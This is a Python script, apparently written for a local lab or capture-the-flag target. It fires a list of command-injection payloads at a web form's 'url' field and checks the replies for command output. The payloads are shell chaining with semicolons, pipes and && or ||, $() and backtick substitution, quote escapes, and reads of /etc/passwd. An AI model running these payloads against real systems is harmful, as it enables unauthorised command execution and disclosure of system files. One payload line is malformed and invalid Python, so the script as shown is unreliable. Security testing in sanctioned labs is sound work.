import requests

# Target endpoint
url = "http://127.0.0.1:32998/add_url"

# Try various command injection techniques
test_payloads = [
    # Basic concatenation without semicolons
    ("; ls -la", "Semicolon basic"),
    ("&& ls -la", "AND operator"),
    ("|| ls -la", "OR operator"),
    ("| ls -la", "Pipe operator"),
    
    # Command substitution
    ("$(ls -la)", "Dollar parentheses"),
    ("`ls -la`", "Backticks"),
    
    # Different contexts
    (""; ls -la; "", "Quoted semicolon"),
    ("'; ls -la; '", "Single quote escape"),
    ('"; ls -la; "', 'Double quote escape'),
    
    # Null byte or other tricks
    ("\x00 ls -la", "Null byte"),
    ("# ls -la", "Comment"),
    
    # Direct injection attempt
    ("http://example.com; ls -la", "URL with semicolon"),
    ("http://example.com && ls -la", "URL with AND"),
    ("http://example.com | ls -la", "URL with pipe"),
    
    # Maybe we need to escape properly
    ("; cat /etc/passwd", "Test passwd"),
    ("| cat /etc/passwd", "Pipe passwd"),
    ("$(cat /etc/passwd)", "Dollar passwd"),
    ("`cat /etc/passwd`", "Backtick passwd"),
]

print("Testing different command injection techniques...\n")

for payload, description in test_payloads:
    data = {"url": payload}
    
    try:
        response = requests.post(url, data=data, timeout=10)
        content = response.text
        
        # Check if we got command output (longer than error message)
        if len(content) > 100 or 'passwd' in content or 'root' in content or 'bin' in content:
            print(f"\n[!] SUCCESS with '{description}'")
            print(f"    Payload: {repr(payload)}")
            print(f"    Response ({len(content)} bytes):\n{content[:2000]}")
        else:
            print(f"[-] {description}: {content[:80]}")
            
    except Exception as e:
        print(f"[!] Error with '{description}': {e}")

